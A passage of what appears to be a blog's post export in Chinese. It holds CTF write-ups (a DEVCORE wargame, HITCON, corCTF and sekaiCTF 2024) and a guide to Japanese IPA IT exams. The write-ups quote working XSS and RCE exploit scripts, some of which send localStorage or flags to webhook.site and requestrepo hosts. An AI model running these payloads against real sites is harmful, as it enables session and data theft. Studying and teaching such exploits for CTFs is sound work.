'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkZha2UgdG9rZW4gZm9yIGNrZWRpdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.6nNLxp10uP65V_NFrs5IWuX2tkk6vGQ-oiwYhHNdHgk'; exit(); &#125; if (isset($_FILES['file']) &amp;&amp; is_uploaded_file($_FILES['file']['tmp_name'])) &#123; header('Content-Type: application/json; charset=utf-8'); $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION); $filename = random_str(32).'.'.$ext; if (isset($_POST['rename'])) &#123; $filename = $_POST['rename']; &#125; if (isset($_POST['folder'])) &#123; $folder = $_POST['folder']; if (!file_exists(IMAGE_PATH.$folder)) &#123; mkdir(IMAGE_PATH.$folder); &#125; $filename = $folder.'/'.$filename; &#125; $filepath = IMAGE_PATH . $filename; move_uploaded_file($_FILES['file']['tmp_name'], $filepath); system(\"rsync_wrap \".escapeshellarg($filepath)); $id = base64_urlsafe_encode($filename); echo json_encode([ 'default' => '/image.php?id='.$id ]); &#125; else &#123; http_response_code(400); &#125; 先試著上傳到 ../../../../../usr/share/nginx/frontend 看看，就得到了第五組 flag： 但實際試了一下發現檔案其實沒寫進去，也嘗試了其他路徑，例如說 b8ck3nd，或我有想說會不會是要寫進去 /usr/share/nginx/frontend/third_party/vendor 然後搭配前面提到的 mpdf 觸發 phar 漏洞（感覺滿合理的），但這邊也寫不進去。 或是寫進 langs 裡面搭配切換語系來引入檔案，但這邊也寫不進去。 想了一陣子之後嘗試寫到 /tmp，這邊倒是沒問題，於是答案就很明顯了，先寫一個檔案 /tmp/test1234.php，然後再寫一個 /tmp/sess_abc，因為可以操控 session 檔案內容，於是就可以自己填入想要的 lang，操控 $_SESSION[&#39;lang&#39;] 的值，搭配最開始提到的 include.php 引入自己寫的 web shell，就可以 RCE 了。 RCE 以後就可以在根目錄執行 /readflag 讀到 flag。 於是六把 flag 我獨缺第二把，其他都完成了，但最後那把到底在哪裡？我拿到 shell 之後有去裡面稍微翻了一下，原本猜說可能是在 nginx config 裡面，但怎麼找都沒找到（話說即使玩到最後我都沒找到 nginx config 在哪）。 又過了大概半小時，flag 出現的順序應該會跟解題的順序跟難易度差不多，既然第一把是 Path Traversal，第三把是 SQL injection，就代表第二把應該是出現在兩個中間才對，於是我突然有了個想法，心裡想著「不會吧…」 然後前往 http://web.ctf.devcore.tw/order.php?id=1&amp;sig[]=1 第二把 flag 就這樣出現在我眼前了 總結最後來檢討一下這次碰到的問題。 第一個最嚴重的問題就是讀檔那邊沒有找到關鍵檔案，導致後續整個卡死。 以後碰到這種可以讀本地檔案的漏洞，應該要自己建個字典檔，不然每次都要 google 半天有哪些可以讀，之後來寫一篇整理一下好了。 第二個問題是沒注意到第二把 flag，其實 sql injection 的時候如果該拿的資料都有拿完，應該也是看得到，所以以後記得可以把 db 整個 dump 出來。 總之我覺得還是滿好玩的，感謝 DEVCORE 的 wargame，而最後也因為挑戰時間有延長一點，順利拿到了 DEVCORE 發的挑戰者 NFT！","link":"/2021/11/30/hitcon2021-devcore-wargame-writeup/"},{"title":"HITCON CTF & corCTF & sekaiCTF 2024 筆記","text":"久違的筆記，想寫很久了但一直拖延，像是 CTF 這種東西的 writeup 其實速度滿重要的，因為賽後討論大部分都在 Discord 裡面發生，時間久了訊息比較難找，而且很有可能忘記，要趕快寫成 writeup 才能把那些實用的資訊記錄下來。 這篇一次帶來三個 CTF 的 writeup，有些我沒有打，只是純粹看著別人的筆記重新記一遍而已。 關鍵字列表： bfcache response splitting Service-Worker-Allowed gunicorn script_name socket.io disconnect socket.io JSONP CSP bypass performance API streaming HTML parsing content-type ISO-2022-JP HITCON CTF 2024Private Browsing+這題基本上是個 proxy，會把 /~huli/ 底下的東西 proxy 到其他網站，而 response 會根據 header 不同而有所不同： if ( req.headers['sec-fetch-mode'] &amp;&amp; req.headers['sec-fetch-mode'] !== 'navigate' &amp;&amp; req.headers['sec-fetch-site'] === 'same-origin' ) &#123; req.url = chunks.slice(2).join('/') proxy.handler(req, res) &#125; else &#123; res.writeHead(200, &#123; ...DEFAULT_HEADERS, 'content-type': 'text/html' &#125;) res.end(VIEWER_HTML.replace('SITEB64', btoa(proxy.site))) &#125; 如果是 navigate 的話，就會回傳 VIEWER_HTML，在這裡面會做各種 sanitize，所以沒辦法 XSS。 繞過方式是利用 bfcache，在 SECCON CTF 2022 Quals - spanote 有出現過，簡單來講呢，我們先造訪 target.html，此時的 response 會是 VIEWER_HTML，而在 VIEWER_HTML 內會執行 fetch(&#39;target.html&#39;) 去把內容抓回來，這時候 response 就會被放在 cache 中 再來，我們把同個分頁導到自己的 origin，接著執行 history.go(-1)，把 URL 導回去 target.html，此時因為 bfcache 的關係，就會載入用 fetch(&#39;target.html&#39;) 所抓取的 HTML，繞過了原本的限制，可以載入任意 HTML。 但下一個問題是 CSP：default-src &#39;self&#39;;，因此 script 只能載入 same-origin 的，但 proxy 那邊有限制： if ( res.headers['content-type'].toLowerCase().includes('script') || req.headers['sec-fetch-dest'] === 'script' ) &#123; res.headers['content-length'] = '0' delete res.headers['transfer-encoding'] &#125; 如果 content type 包含 script，直接把 content-length 變成 0，因此沒辦法載入 script。 這時候就要用到 response splitting 了，因為 proxy 那邊會直接把收到的 response pipe 出去，因此可以構造出這樣的流程： 在 browser 那端發出第一個請求，就叫請求 A 吧 在請求 A 的 response 中先輸出 expect: &#39;100-continue&#39; header，讓 proxy server 那邊把 header 輸出，此時對瀏覽器來說第一個請求已經結束，拿到了 response， browser 發出第二個請求 B，延用同一個 connection 這時輸出請求 B 的 response（但是對 proxy 來說還是請求 A 的 response），繞過 content type 的限制，因為 proxy 認為這是 response content 簡單來講就是類似 request smuggling 那樣，不過是反過來做。 這邊的細節有兩個： 透過 Chrome 對同一個 domain 有 6 個 concurrent 的限制，確保其中兩個請求會用到同一個 connection Node.js server 在收到 Expect: 100-continue 的時候，會先 flush，這一步是必要的，要繞過 Chrome 的限制 可以載入 JS 之後，就再用一樣的方法載入 service worker，並且用 Service-Worker-Allowed: / header 來擴大 scope，可以註冊到整個 origin。 更多細節可以參考 maple 的 writeup: https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202024/Private%20Browsing%2B corCTF 2024web&#x2F;corctf-challenge-dev - 17 solvesAuthor: drakon 一個跟 Chrome extension 有關的題目，但作者已經寫得很詳細了，就不多寫了：corCTF 2024 - corctf-challenge-dev web&#x2F;iframe-note - 2 solvesAuthor: sterllic 這題的核心程式碼是底下這段： &lt;iframe id=\"iframe\">&lt;/iframe> &lt;script src=\"&#123;&#123; url_for('static', filename='axios.min.js') &#125;&#125;\">&lt;/script> &lt;script src=\"&#123;&#123; url_for('static', filename='can.min.js') &#125;&#125;\">&lt;/script> &lt;script> window.onload = () => &#123; if ([\"__proto__\", \"constructor\", \"prototype\"].some(d => location.search.includes(d))) &#123; return; &#125; const qs = can.deparam(location.search.slice(1)); if (!qs.id) &#123; alert(\"no id provided\"); location.href = \"/\"; &#125; axios.get(`/iframe/$&#123;encodeURIComponent(qs.id)&#125;`) .then(res => &#123; if (res.data.error) &#123; alert(\"no iframe found with that id!\"); return; &#125; if (!res.data.url.toLowerCase().startsWith(\"http\")) &#123; alert(\"invalid url\"); return; &#125; document.querySelector(\"#name\").textContent = res.data.name; document.querySelector(\"#iframe\").src = res.data.url; document.querySelector(\"#iframe\").style = res.data.style; &#125;); &#125; &lt;/script> 後端用 Flask + gunicorn 渲染出上面這個網頁。 can.js 有個 prototype pollution 的漏洞，就算有做了檢查還是可以用 URL encode 繞過，但問題是有了 pollution 之後可以幹嘛。 前端乍看之下就是 document.querySelector(&quot;#iframe&quot;).src = res.data.url 這段最可疑了，但是這邊需要能控制 server 的 response，但是 server 那邊有做檢查，因此 data.url 只能是 http 開頭。 最後的解法是跟 axios、bfcache 還有 gunicorn 的行為有關，gunicorn 會根據 header 裡面的 script_name 來決定最後的 path，以 Gunicorn’s handling of PATH_INFO and SCRIPT_NAME can lead to security issues when placed behind a proxy #2650 裡面給的範例來說： requests.get(URL+'/REMOVED/admin/something/bad', headers=&#123;'script_name':'REMOVED/'&#125;) 如果前面有個 nginx 把所有 &#x2F;admin 開頭的請求都擋掉，這時我們可以發送一個 &#x2F;REMOVED&#x2F;admin 的請求再搭配 script_name 是 REMOVED&#x2F;，nginx 會通過，但是到 gunicorn 的時候就會把 path 解析為 &#x2F;admin，直接繞過了前面的 nginx 檢查。 而這題會用到這個行為的地方在： &lt;script src&#x3D;&quot;&#123;&#123; url_for(&#39;static&#39;, filename&#x3D;&#39;axios.min.js&#39;) &#125;&#125;&quot;&gt;&lt;&#x2F;script&gt; 如果你執行 curl https://iframe-note.be.ax////example.com/view -H &quot;SCRIPT_NAME: //example.com，那最後 path 是 &#x2F;view，但是 base URL 會變，渲染的結果是： &lt;script src=\"//example.com/static/axios.min.js\">&lt;/script> 就能夠直接控制頁面上的 src。 作者可能懶得弄一個 instance 來 host payload，因此直接用了 data URI，把 script 變成 &lt;script src=&quot;data:text/javascript,&#123;XSS&#125;&quot;&gt; 因為要達成這個結果需要在請求中傳送 header，所以需要用到 bfcache，流程是： 先造訪最後需要的 URL 跳轉到 view 頁面，利用 prototype pollution 讓 fetch 送出有 header 的請求 回到上一頁，此時因為 bfcache，會沿用剛剛 fetch 的 response，就是有 header 的版本 XSS 作者的 exploit： &lt;body> &lt;script> // const BASE_URL = \"http://localhost:3000\"; const BASE_URL = \"https://iframe-note.be.ax\"; const HOOK_URL = \"https://webhook.site/xxxxx\"; const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms)); const main = async () => &#123; const dataUrl = `data:text/javascript,navigator.sendBeacon('$&#123;HOOK_URL&#125;',JSON.stringify(localStorage))`; const win = open(`$&#123;BASE_URL&#125;/$&#123;dataUrl&#125;/iframe/view`); await sleep(1000); win.location = `$&#123;BASE_URL&#125;/view?id=view&amp;__%70roto__[headers][SCRIPT_NAME]=$&#123;dataUrl&#125;/iframe&amp;__%70roto__[baseURL]=/$&#123;dataUrl&#125;/`; await sleep(1000); win.location = `$&#123;location.origin&#125;/back.html?n=2`; &#125;; main(); &lt;/script> &lt;/body> &lt;script> const n = parseInt(new URLSearchParams(location.search).get(\"n\")); history.go(-n); &lt;/script> corchat x - 1 solveAuthor: larry 跟 socket.io 有關的題目，重點看起來是三個： 可以送出 disconnect 事件但是沒有 disconnect sokcet.io 的 JSONP 可以拿來 bypass CSP 用 performance API 列出曾經載入過的資源 底下附上 Discord 中 EhhThing 貼的 exploit： import socketio import requests import time import json base_url = 'https://corchat-x-a6e1f8c45d3ca520.be.ax' def create_sid(): session = requests.Session() login = session.post(f'&#123;base_url&#125;/', data = &#123;&#125;, allow_redirects=False) assert login.status_code == 302, login.status_code res = session.get(f'&#123;base_url&#125;/socket.io/', params = &#123; 'EIO': 4, 'transport': 'polling', 't': 'bingus', &#125;) assert res.status_code == 200, res.status_code socket_session = json.loads(res.text[1:]) print('fake session', socket_session) res = session.post(f'&#123;base_url&#125;/socket.io/', params = &#123; 'EIO': 4, 'transport': 'polling', 't': 'P3qHGUZ', 'sid': socket_session['sid'], &#125;, data = b'40') assert res.status_code == 200, res.status_code return socket_session['sid'] bot_session = requests.Session() login = bot_session.post(f'&#123;base_url&#125;/', data = &#123; 'name': 'FizzBuzz101', &#125;, allow_redirects=False) assert login.status_code == 302, login.status_code sio = socketio.Client(http_session=bot_session) ready = False @sio.event def connect(): global ready print('connected!') # fake disconnect event so that the bot can connect as well sio.emit('disconnect') time.sleep(1) ready = True print('ready for bot!') @sio.event def message(data): global ready if not ready: return print('message', data) if data['content'] == 'FizzBuzz101 joined.': # XSS bot opened the chat first_sid = create_sid() js_payload = \"\"\" (window.exfil = data => window.top.opener.top.socket.emit('message', data)) (window.observer = new parent.PerformanceObserver((list) => &#123; list.getEntries().forEach((entry) => &#123; window.exfil('Flag: ' + decodeURIComponent(entry.name.split('/').pop())); &#125;); &#125;)) (window.observer.observe(&#123; type: 'resource', buffered: true &#125;)) \"\"\".strip().replace('\\n', ',') sio.emit('message', '\\\\\"+'+js_payload+');//') second_sid = create_sid() jsonp_url = f'&#123;base_url&#125;/socket.io/?EIO=4&amp;transport=polling&amp;t=bingus&amp;sid=&#123;second_sid&#125;&amp;j=0' js_payload = \"\"\" (window.secret=window.open('','secret')) (window.a=window.top.document.getElementById('xss').cloneNode()) (window.a.srcdoc=window.a.srcdoc.replace('%s','%s')) (window.secret.document.body.appendChild(window.a)) \"\"\".strip().replace('\\n', ',') % (second_sid, first_sid) sio.emit('message', '\\\\\"+'+js_payload+');//') xss_payload = \"\"\" &lt;a id=&amp;quot;___eio&amp;quot;>&lt;/a> &lt;a id=&amp;quot;___eio&amp;quot;>&lt;/a> &lt;script src=&amp;quot;%s&amp;quot;>&lt;/script> \"\"\" % jsonp_url chat_message = '&lt;iframe id=\"xss\" srcdoc=\"%s\">&lt;/iframe>' % xss_payload.strip() assert len(chat_message) &lt; 400, 'chat message too long, time to write better payload' sio.emit('message', chat_message) sio.connect(base_url) sio.wait() web&#x2F;repayment-pal - 0 solveAuthor: strellic 跟 Next.js 有關的題目，賽中沒有人解開，賽後也沒有公佈解法。 底下是公佈過的提示： +24 hour hint drop: hm, why is dev mode enabled? +36 hour hint drop: try to find a way to get html injection! Post-CTF hint drop: An earlier version of the challenge had an extra check in the middleware, requiring all API requests to have the header Sec-Fetch-Dest: empty sekaiCTF 2024htmlsandbox (4 solves)Author: arxenix 題目連結：https://github.com/project-sekai-ctf/sekaictf-2024/tree/main/web/htmlsandbox 這題可以讓你上傳 HTML，但是把能擋的全部都擋掉了，並且會檢查 head 裡面有沒有：&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;none&#39;&quot;&gt;，來確保不能執行 JavaScript 程式碼。 而解法是檢查的時候是把 HTML 變成 data:text/html 來檢查，但實際造訪的時候就是一般的網頁，而這兩者的 parsing 規則不一樣，當檔案很大的時候，前者會全部一次 parsing，但後者會一個 chunk 一個 chunk 做，而且每個 chunk 的 encoding 可以不同。 細節可以看作者的 writeup：SekaiCTF’24 htmlsandbox - Author Writeup 或是這篇 0xalessandro 的 writeup，他最後的 exploit 長這樣： import requests #0xAlessandro was here c1 = b'''&lt;html>&lt;head> &lt;!-- \\x1b$@ aa -->''' + b''' &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'\"> \\x1b(B &lt;!-- test --> ''' + b\"\\x1b(B&lt;!-- \" + b\"A\"*64000 + b\"-->\"+ b\"&lt;!--\"+b\"A\"*100+b\"-->\" c2 = b''' &lt;meta charset=\"utf-8\"> &lt;/head> &lt;body> &lt;svg>&lt;animate onbegin=\"fetch(`https://s9cs3dwb.requestrepo.com?c=$&#123;localStorage.getItem('flag')&#125;`)\" attributeName=\"x\" dur=\"1s\"> &lt;/body> &lt;/html>''' html = c1 + c2 with open('test.html', \"wb\") as f: f.write(html) r = requests.post('https://htmlsandbox.chals.sekai.team/upload', data=&#123;'html': html&#125;) print(r.text) 在使用 data URI 的時候，整個 HTML 就是被當作 utf-8 來解析，沒什麼問題。 但被當作網頁來造訪的時候，由於分成了兩個 chunk，而 &lt;meta charset=&quot;utf-8&quot;&gt; 出現在第二個 chunk，因此第一個 chunk 會用 JIS X 0208 1983 來解析，CSP 就變成了一堆亂碼，被拿掉了。 讀到第二個 chunk 時看到 meta，就切換成 UTF-8，照常載入，如此一來就可以擺脫 CSP，達成 XSS。 這個 encoding 利用的細節可以參考：Encoding Differentials: Why Charset Matters。","link":"/2024/09/23/hitconctf-corctf-sekaictf-2024-writeup/"},{"title":"零日文基本情報技術者與情報セキュリティマネジメント試験準備心得","text":"近期我以零日文基礎的身份開始唸書並通過了日本的基本情報技術者以及情報セキュリティマネジメント試験，這篇會分享我是怎麼準備的，又運用了哪些考試技巧。 文章大綱如下： 為什麼要考這兩個考試？ 日本 IPA 相關證照簡介 情報セキュリティマネジメント試験在考什麼？ 基本情報技術者試験在考什麼？ 我是怎麼準備考試的？策略是什麼？ 考試如何進行？ 考試的心得以及分數 為什麼要考這兩個考試？如果想去日本工作的話，你會需要申請工作簽證。而工程師申請的會是一個叫做「技術・人文知識・国際業務」的類別，能申請的詳細資格在日本出入國在留管理廳有記載，裡面有個該当する活動・上陸許可基準についてはこちら 的 PDF 檔案（如果連結壞了代表文件搬家了，可以自己用關鍵字 google，應該找得到）。 （話說有些讀者可能有聽過高度人才機制，根據我的理解，就算你高度人才有 70 分，沒有符合底下的條件也沒辦法申請到簽證） 其中有一個條件是必須要證明你有從事該工作的專業能力，那要怎麼證明呢？ 大學（或以上）相關科系畢業 日本的專科學校畢業 十年以上工作經驗（更嚴格講起來原文是寫實務經驗，似乎以前在學校有主修相關課程的期間也算） 第一點的話我有聽說過一些不是相關科系畢業但還是有辦過簽證的案例。 但我的狀況不一樣，我最高學歷就是高中畢業。 補充一下，據說根據公司的規模大小，會看的資料跟資格也不太一樣，因此理論上能不能過關，還是要看專業的行政書士的建議，最後實際上是否通過，就看入管局那邊怎麼判斷。 但總之呢，我們公司有諮詢過行政書士了，結論就是以我的條件來說應該是辦不過。 如果像我一樣，只有高中畢業學歷，也還沒到十年工作經驗該怎麼辦？（或是拿不出十年經驗的證明，例如說以前公司倒閉又沒留下離職證明之類的，或許勞保紀錄也可以但我不確定） 條款上有特別寫一個但書： ただし，申請人が情報処理に関する技術又は知識を要する業務に従事しようとする場合で，法務大臣が告示をもって定める情報処理技術に関する試験に合格し又は法務大臣が告示をもって定める情報処理技術に関する資格を有しているときは，この限りでない 根據 Google 翻譯，大意就是如果你要從事技術相關工作（像是軟體工程師），如果你有法務大臣公告規定的相關證照的話也可以，也能證明你有足夠的專業能力。 那有哪些證照可以呢？ 在這邊有列出來：出入国管理及び難民認定法第七条第一項第二号の基準を定める省令の技術・人文知識・国際業務の在留資格に係る基準の特例を定める件 除了日本當地的證照以外，像是泰國、菲律賓以及韓國等等，甚至台灣的證照也可以！ 有一個叫做 ITPEC 的組織，基本上就是幾個國家串連起來考一樣的東西，而題目似乎是日本考試的英文翻譯版。 而台灣的話並沒有在那個組織裡面，根據上面的列表，由資策會所實施的這三個測驗是有效的： 軟體設計專業人員 網路通訊專業人員 資訊安全管理專業人員 更詳細的規定在這邊：相互認証：台湾の試験制度について 而最下面有幾行小字： 台湾の試験制度については、2012年末をもって台湾経済部からCSF&#x2F;IIIに移管されました。これに合わせて、相互認証の覚書に代わり、試験に係る両国の協力を定めた相互協力協定（Mutual Cooperation Agreement, MCA)を2013年1月21日に締結しました。これにより、台湾の試験に係る就労ビザの取得緩和措置は、台湾経済部が承認した2012年末までの試験合格者が対象となります。 根據 PTT 以前的討論，似乎是指說只有 2012 以前考的才有效。不過根據我公司幫我直接去入管局問的結果，那幾行好像不是這個意思，因此你現在去考也還是有效。 所以對於台灣的這幾個考試還有沒有效力這點，我只能說我不知道，所以如果有人想走這條路的話，可以自己透過日本朋友或是行政書士去問問看，得到的答案會比較準確。 這些證照除了可以作為申請工作簽證的資格證明以外，在高度人才制度的計分表上也是有算分數的，一張 5 分，最多兩張，所以考過兩張你就加 10 分了，聽起來不錯對吧。 總之呢，考取相關證照的好處有兩個： 不需要大學學歷以及十年工作經驗，也能辦過日本的工程師工作簽證（理論上是這樣，我還在肉身實測中） 高度人才加分 那要怎麼考到這些證照？有三條路： 去 ITPEC 有合作的地方考試（像是菲律賓、泰國我就聽過有人去） 在台灣考試（但不確定是否有效，要自己去問問看） 直接去日本考試，考出來的證照絕對有效 第一條路可以參考 ITPEC Exam: Be an Engineer in Japan Without a Degree 跟 Getting a Visa as an Engineer in Japan，裡面有提到相關資訊。 而這篇主要講的就是第三條路，直接考日本的考試。 日本 IPA 相關證照簡介我們想要考到的證照是由日本情報處理推進機構 IPA 所辦理的考試，目前的考試制度底下這張圖講得很清楚，取自：https://www.ipa.go.jp/shiken/kubun/list.html 先從最左下角開始，那是一個叫做 IT passport 的測驗，最簡單通過率最高，但是沒什麼用，不能拿來辦工作簽證，高度人才也不會加分。 再往上是情報セキュリティマネジメント試験，翻中文就是資訊安全管理測驗，簡稱 SG，這個待會會提到，基本上是第二簡單的，通過率也是第二高。 接著中間那排最底下是基本情報技術者試驗，簡稱 FE，第三簡單的，但已經開始有點難度，會考到計算機概論或是一些寫程式的題目。 再上去應用情報技術者試驗 AP 就又更難，再再上去就是各種分門別類，難度又再更高了。 總之呢，以我們的目標（考到日本 IT 證照）來說，最適合的就是這兩張了： SG 情報セキュリティマネジメント試験 FE 基本情報技術者試驗 話說這些考試的中文相關資料很少，在此特別感謝這一篇知乎的文章介紹這個考試制度：这可能是最详细的【情報処理技術者試験】解说文章（附复习网站），惠我良多。 情報セキュリティマネジメント試験在考什麼？我自己覺得考試內容有點像在公司裡面做藍隊（防守端）資安相關的同事的工作內容，官網的介紹是這樣的： 情報システムの利用部門にあって、情報セキュリティリーダーとして、部門の業務遂行に必要な情報セキュリティ対策や組織が定めた情報セキュリティ諸規程（情報セキュリティポリシーを含む組織内諸規程）の目的・内容を適切に理解し、情報及び情報システムを安全に活用するために、情報セキュリティが確保された状況を実現し、維持・改善する者 情報就是 information 的意思，中文的「資訊」，看不懂日文也沒關係，可以透過漢字大概猜出上面的意思是什麼。 所以考試的內容就會有一些跟技術相關，例如說你需要知道基本的攻擊有哪些，什麼是 DoS，什麼是 XSS，什麼又是 SQL injection。也會考到一些基本的加解密，例如說對稱式跟非對稱式加密要搞清楚，該怎麼使用這些密碼學的東西去做驗證也要大概知道流程是什麼。 而管理面有些是法規，有些則是一些資安管理上的措施。 剛好我之前轉去做資安，雖然是做很技術面的，但恰巧有些東西對這個考試就有幫助，例如說有些名詞我會知道它在幹嘛，像是 SOC（Security Operation Center） 跟 IR（Incident Response）等等。 考試時間是 120 分鐘，總共 60 題選擇題。其中 48 題叫做 A 科目，會是四選一的單選題，另外 12 題叫做 B 科目，會是選項不一定的單選題（例如說八選一之類的）。 （會分 AB 是因為以前兩個科目分開考，但現在已經合併一起考了） 滿分 1000 分，600 分合格，至於怎麼配分它不會跟你講。 講了這麼多制度相關的東西，大家應該很想實際看看題目到底長什麼樣子，底下我就隨機挑一兩題官方公布的題目讓大家看一下。 這題是 A 科目，來自令和元年秋期問 18： Q: WPA3はどれか。 A: HTTP通信の暗号化規格B: TCP&#x2F;IP通信の暗号化規格C: Webサーバで使用するディジタル証明書の規格D: 無線LANのセキュリティ規格 這題也是 A 科目，來自平成 31 年春期問 11： Q: SPF(Sender Policy Framework)を利用する目的はどれか。 A: HTTP通信の経路上での中間者攻撃を検知する。B: LANへのPCの不正接続を検知する。C: 内部ネットワークへの不正侵入を検知する。D: メール送信者のなりすましを検知する。 至於 B 科目的話比較像是應用題，因為有表格有圖片很難寫在這邊，我就大概描述一下，想看真的題目的可以到這邊：https://www.ipa.go.jp/news/2022/shiken/gmcbt80000007cfs-att/sg_set_sample_qs.pdf 例如說上面貼的第 50 題，他會給你評價風險的表格跟指引，然後把表格中的幾個地方挖空，問你說根據上面的資料，應該要填幾分才是正確的。 這個科目我覺得你有待過大公司可能會有點優勢，因為通常大公司都比較多那種資安管理的規定，所以身為被管的一方，你大概會知道公司有哪些措施。 基本情報技術者試験在考什麼？FE 這個考試的英文是：Fundamental Information Technology Engineer Examination，簡單來說就是 IT 工程師的基礎知識考試。 剛剛 SG 是 AB 科目合在一起考，分數也一起算，而 FE 就不同了，兩個科目會分開考。 A 科目是 60 題四選一的單選題，考試時間為 90 分鐘。 B 科目是 20 題多選一的單選題（例如說有可能八選一），考試時間為 100 分鐘。 兩科分數各自計算，滿分都是 1000 分，兩科都要 600 分以上才算合格。 A 科目考的有部分會跟 SG 重疊，例如說一些基本資安概念或是風險概念等等，其他部分我覺得就滿計算機概論了，例如說以前學過的位元運算啦，二進位補數啦，OSI 七層啦諸如此類的都在考試範圍內。 而 B 科目就比較有趣，考的是程式碼的填空題。 一樣給大家看一下以前官方有公佈的題目，這題來自平成 28 年秋期問 19： Q: LRUアルゴリズムで，ページ置換えの判断基準に用いられる項目はどれか。 A: 最後に参照した時刻B: 最初に参照した時刻C: 単位時間当たりの参照頻度D: 累積の参照回数 B 科目一樣很難打在這邊，看這邊最快：https://www.ipa.go.jp/news/2022/shiken/gmcbt80000007cfs-att/fe_kamoku_b_set_sample_qs.pdf 例如說裡面第二題就是把知名的 FizzBuzz 程式碼挖空，問你說應該要填什麼進去。 如果你沒有接觸過資安相關的東西，對一切名詞都很陌生的話，那 FE 會是工程師比較適合的考試。 我是怎麼準備考試的？策略是什麼？先推薦大家兩個神之網站，裡面有以前 SG 跟 FE 的考古題，可以方便練習： SG https://www.sg-siken.com/ FE https://www.fe-siken.com/ 我一開始做的事情就是去做 SG 的模擬測驗，然後用 Google 翻譯，翻譯完之後再答題，發現 50 題裡面我答對了 38 題，有 76% 的正確率。 雖然說沒有到很高分，但代表說我的基本知識是足夠應付這個考試的，如果考試都是中文，那我八成會通過。 這是我的考試策略的一個大前提，就是假設是在中文的情況下，你必須能夠通過考試。代表你缺乏的並不是技術相關知識，而是語言。 那語言的問題該怎麼解決？ 剛剛前面我大致介紹了這些考試在考什麼，也給大家看了一些考古題，可能有些人已經察覺到了： 我明明不會日文，可是剛那些題目我好像大概都看得懂？ 沒錯，這就是我的考試策略。 雖然說是日本的考試，但是題目中其實會出現三種不同的字： 日文平假名 日文片假名 漢字 我的考試策略就是放棄第一個，靠著後兩個猜題目大概的意思，然後選答案。 日文片假名通常都用來寫外來語，而像是 SG 跟 FE 這種很技術的考試，基本上都會是技術名詞，例如說 サーバ 直接寫成拼音是 sa ba，就是英文的 server。如果我們能熟悉日文片假名以及技術名詞，那至少題目的關鍵字我們看得懂。 漢字的話儘管有些漢字的意思跟中文不同，但那是少數的狀況，在多數的狀況之下（至少以這個考試來說），都跟中文是類似的。 例如說我前面貼過的考古題： Q: LRUアルゴリズムで，ページ置換えの判断基準に用いられる項目はどれか。 A: 最後に参照した時刻B: 最初に参照した時刻C: 単位時間当たりの参照頻度D: 累積の参照回数 如果你知道什麼是 LRU cache，就大概能猜出題目是在問說 LRU 是怎麼決定要把哪些元素換掉，而答案就是 A，根據最後參考到的時間。若是你能看懂片假名，對題目的理解就會變成：「LRU algorithm，page 置換えの判断基準に用いられる項目はどれか」，就更有把握了一點。 所以我的考試策略很簡單，說穿了就是「在基礎知識足夠加上看得懂中文的狀況下，靠著學習片假名，試圖看懂題目抓關鍵字答題」。 我自己有幾個優勢： 對考試滿有自信，自認算是會考試（畢竟以前高中指考有考上台大，對唸書考試有自信） 基本知識足夠，資安跟工程師都有一些經驗，計概也沒忘光 當初的想法就是我想親自去驗證看看這個考試策略有沒有效，考完之後再來寫文章分享（沒考過也會寫沒考過的心得）。 接著大概講一下我的準備步驟跟流程有哪些。 話說我一開始決定要準備的考試就是 SG，後來為什麼會再報 FE 這個等等再講，總之我底下的準備流程都是 SG，但是要準備 FE 的話也類似。 第一步：背五十音對，我是連五十音都不會的。雖然說大概一年前有去補習班上過兩堂的 50 音，但幾乎忘光了，所以可以算是零基礎。 因為我們講究的是速成，所以要記住一件事情：「只要能讓你背起來的方法，就是好方法」。有些五十音比較難記，就會有些口訣產生，可能是朋友教你或是網路上看來的，只要能讓你背起來，那就是好方法。 就像小時候很多那種英文諧音記憶法，我老婆跟我吵架以後跑去陽台，說「我不要看你」了，不要看你，balcony，陽台。 我這邊有用一些手機 App 輔助，用的是 50音起源 - 日語五十音單詞學習。 我是 3&#x2F;15 開始背五十音的，大概認真背了兩三天，除了幾個容易搞混的以外，其他差不多都記起來了。然後因為考試策略是以片假名為主，所以如果真的想省時間，平假名可以跳過。不過我自己是兩個一起啦，我想說都要背了，兩個一起背比較好，有些也會比較好記。 這個步驟我總共花了大概五六天，包含平假名、片假名、拗音跟濁音等等，濁音不熟需要想一下，然後有些片假名還是容易搞混，平假名到後來滿不熟的，但沒關係，先以片假名為主。 第二步：看書我剛開始的策略其實是邊寫考古題邊學習，但後來發現這樣很沒系統性，學習效率不是很好，因此改成買書。 我自己買的是情報処理教科書 出るとこだけ！情報セキュリティマネジメント テキスト＆問題集［科目A］［科目B］2023年版這本，我看他說自己是銷售第一名就買了。 我買的是 Kindle 電子版，但我沒有 Kindle，所以我是在 Mac 上面用 Kindle app 打開的，然後他的電子書都是圖片，所以我是用手機的 Google 智慧鏡頭拿去拍電腦螢幕來翻譯的，藉此來看懂書上的內容，genius。 接著就是用電腦做筆記，我會把裡面出現過的片假名都讀過，並且用日文輸入法重新打在筆記上，加上英文或中文註解，筆記大概長得像底下這樣 ハッカー(hacker) ホワイトハッカー(white hacker) クラッカー(cracker) スクリプトキディ(scripe kiddie) ソーシャルエンジニアリング(social engineering) 有用輸入法打過一次會更印象深刻，下次看到就比較不會忘記。 而有些東西如果我本來不太知道意思，就會大概寫一下在幹嘛，像這樣： 類推攻擊：用 id, 姓名等個人資料去推出密碼 辭書攻擊：就是字典檔 プルートフォース (brute force)：猜密碼 リバースブルートフォース (reverse brute force)：固定密碼猜帳號 パスワードリスト (password list)：撞庫，拿其他服務的帳密來試，要注意可能會跟辭書攻擊搞混 レインボー 攻擊 (rainbow) 我就這樣對書的每一頁都做筆記，最後筆記裡有一大堆片假名，然後讀片假名的準確度跟速度也慢慢上升。 然後有些你就算唸了也不知道是什麼的，我會特別記起來，像是： ウイルス virus アカウント account キャッシュ cache パターン pattern トランザクション transaction 特別紀錄在一起，之後複習比較容易。 看書是花最多時間的，大概花了快兩週左右把書全部看完，主要花時間的還是拖延症發作以及抄寫片假名，書中的知識大概有六七成是我本來就知道的，另外三四成有些是日本法規或是風險管理相關的東西，這部分要多花一點時間學習。 